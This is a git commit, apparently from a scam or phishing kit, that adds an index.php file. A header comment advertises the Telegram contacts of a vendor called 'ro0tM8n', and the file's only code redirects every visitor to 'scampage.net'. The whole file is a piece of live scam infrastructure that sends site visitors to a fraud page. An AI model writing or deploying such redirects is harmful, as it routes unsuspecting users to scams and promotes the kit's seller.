482f3f4e30221a8aeffc04947f53e0875fe820a7
gammabeta1 <tracybervelyn@gmail.com>
2024-07-21 16:37:16 -0700

    Add files via upload

---
+++ files/index.php
@@ -0,0 +1,13 @@
+<?php 
+/*
+ _________________________________________________
+| 						  |
+|    CONTACT ME NOW : https://t.me/ro0tM8n        |
+|                                                 |
+| Official Channel : https://t.me/ro0tM8nchannel  |
+|_________________________________________________|
+
+*/
+
+header("Location: https://scampage.net/");
+?>
